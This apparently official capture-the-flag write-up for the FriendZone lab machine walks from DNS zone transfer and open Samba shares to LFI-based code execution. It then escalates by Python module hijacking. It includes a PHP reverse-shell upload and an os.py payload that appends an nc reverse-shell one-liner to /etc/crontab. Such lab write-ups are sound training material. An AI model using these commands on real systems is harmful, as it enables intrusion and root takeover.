@@ -1,0 +1,225 @@
+FriendZone
+
+13t h May 2019 / Document No D19.100.25
+
+Prepared By: MinatoTW
+Machine Author: askar
+Difficulty: Easy
+Classification: Official
+
+                                                                        Page 1 / 13
+SYNOPSIS
+
+FriendZone is an easy difficulty Linux box which needs fair amount enumeration. By doing a zone
+transfer vhosts are discovered. There are open shares on samba which provides credentials for
+an admin panel. From there, an LFI is found which is leveraged to get RCE. A cron is found
+running which uses a writable module, making it vulnerable to hijacking.
+
+Skills Required         Skills Learned
+
+     Enumeration             Module hijacking
+     DNS zone transfer
+
+                                               Page 2 / 13
+ENUMERATION
+
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.123 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr ' \n' ' ,' | sed s/,$//)
+ nmap -sC -sV -p$ ports 10.10.10.123
+
+ PORT STATE SERVICE
+
+ 21/tcp open ftp
+ 22/tcp open ssh
+ | ssh-hostkey:
+ | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+ | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+ |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+ 53/tcp open domain
+ | dns-nsid:
+ |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+ 80/tcp open http
+ |_http-title: Friend Zone Escape software
+ 139/tcp open netbios-ssn
+ 443/tcp open https
+ |_http-title: FriendZone escape software
+ | ssl-cert: Subject:
+ commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODE
+ RED/countryName=JO
+ | Not valid before: 2018-10-05T21:02:30
+ |_Not valid after: 2018-11-04T21:02:30
+ |_ssl-date: TLS randomness does not represent time
+
+FTP is open but without anonymous login. We have DNS open and the certificate shows
+friendzone.red as the commonname.
+
+                                                                                                                  Page 3 / 13
+DNS
+
+As we have a vhost known already, let's use it to do zone transfers. We can use the dig utility to
+achieve this.
+ dig axfr friendzone.red @10.10.10.123
+
+The results contain three new sub-domains i.e administrator1.friendzone.red, hr.friendzone.red
+and uploads.friendzone.red. Add them to the hosts file for further enumeration.
+
+SAMBA
+
+Lets use enum4linux to enumerate the Samba shares.
+ enum4linux 10.10.10.123
+While running it discovers three shares.
+
+                                                                                                                  Page 4 / 13
+The path for Files is defined as /etc/Files. This might be useful later.
+Let's connect to the shares to view the contents.
+ smbclient -N \\\\10.10.10.123\\general
+
+A file creds.txt is found, download it using get. Reading the file,
+ $ cat creds.txt
+ creds f or the admin THING:
+ admin:WORKWORKHhallelujah@#
+Connecting to the Development share, it appears to be empty. However, we can upload files to
+the share.
+
+We get access denied when trying to read the Files share.
+
+                                                                                                                  Page 5 / 13
+APACHE
+
+Apache is running on both HTTP and HTTPS.
+
+HTTP
+
+Navigating to HTTP we have a page with an image.
+
+HTTPS
+
+After accepting the certificate we land on a page with an image.
+
+                                                                                                                  Page 6 / 13
+Let's examine the vhosts we found earlier.
+
+echo ' 10.10.10.123  friendzone.red administrator1.friendzone.red
+
+hr.friendzone.red uploads.friendzone.red' >> /etc/hosts
+
+Navigating to https://administrator.friendzone.red we find a login page.
+
+GOBUSTER
+
+Run gobuster on the administrator vhost with php as extension.
+ gobuster -w directory-list-2.3-medium.txt -t 50 -k -u
+ https://administrator1.friendzone.red/ -x php
+
+After a while,
+
+It finds login, dashboard and timestamp.php. Hitting dashboard.php redirects us to login but if we
+check timestamp.php.
+
+We get a message with the current timestamp.
+
+                                                                          Page 7 / 13
+EXPLOITING LFI
+
+Trying the credentials "admin:WORKWORKHhallelujah@#" obtained from the share earlier we are
+logged in.
+After logging in the page asks us to visit /dashboard.php.
+
+Going to the dashboard we come across this,
+
+Lets try what the page says as default - image_a.jpg&pagename=timestamp.
+
+                                                                                                                  Page 8 / 13
+We get an image and an output similar to the timestamp.php page we found earlier. So maybe
+the page is including timestamp.php and executing it.
+Lets try including another php file like login.php,
+
+We see Wrong! As the output which the login page returns in case of a failed login. Lets leverage
+this LFI to gain RCE as the page is executing php code.
+
+                                                                                                                  Page 9 / 13
+FOOTHOLD
+
+From earlier enumeration we know that the Development share was writable and that the path for
+the Files share is /etc/Files. Let's assume the path for Development share to be /etc/Development
+and upload a shell. Use t his php reverse shell and change the IP and port.
+Upload it to the share using smbclient.
+
+Now hitting,
+ https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename
+ =/etc/Development/php-reverse-shell
+Should trigger our reverse shell.
+
+And we have a shell as www. Get a tty shell using,
+ python -c " import pty; pty.spawn('/bin/bash')"
+
+                                                    Page 10 / 13
+PRIVILEGE ESCALATION
+CRON ENUMERATION
+
+Let's use pspy to enumerate the running crons and processes. Download it and upload it to the
+development share and execute it.
+ cd /tmp
+ cp /etc/Development/pspy64s .
+ chmod +x pspy64s
+ ./pspy64s
+
+After a while we find a script running as root,
+
+Let's check it out.
+ #!/usr/bin/python
+ import os
+
+ to_address = "admin1@friendzone.com"
+ from_address = " admin2@friendzone.com"
+
+ print " [+] Trying to send email to %s"%to_address
+
+ #command = ''' mailsend -to admin2@friendzone.com -from
+ admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub
+ scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+ #os.system(command)
+
+ # I need to edit the script later
+ # Sam ~ python developer
+
+There's nothing unusual about the script and everything is commented out. So it doesn't seem to
+be exploitable.
+
+                                                                                                                  Page 11 / 13
+LINENUM
+
+Having found nothing in the cron script, lets run L inEnum.sh to enumerate further. Download it
+and upload it to the share and then execute it with thorough tests enabled.
+ cd /tmp
+ cp /etc/Development/LinEnum.sh .
+ chmod +x LinEnum.sh
+ ./LinEnum.sh -t 1
+While running it finds some world writable files,
+
+Apart from the files in the share we have /usr/lib/python2.7/os.py. The reporter.py script from the
+crontab imports this script. So, if we write code to os.py, we can hijack it's execution. This is
+known a module hijacking.
+Lets overwrite the crontab with a malicious one. Create a file os.py with contents and upload it to
+the share.
+ shell = ' ''
+ * * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
+ 10.10.16.32 4444 >/tmp/f
+ '''
+ f = open('/etc/crontab', ' a')
+ f.write(shell)
+ f.close()
+And the crontab will send us a reverse shell.
+ cp /etc/Development/os.py /usr/lib/python2.7/os.py
+
+                                                                                                                 Page 12 / 13
+The script appends the reverse shell one liner to the end of the crontab.
+Now when the script runs next the crontab should get copied and we'll get a shell.
+
+The script has written the reverse shell in the crontab and we have shell.
+
+                                                                                                                 Page 13 / 13
+
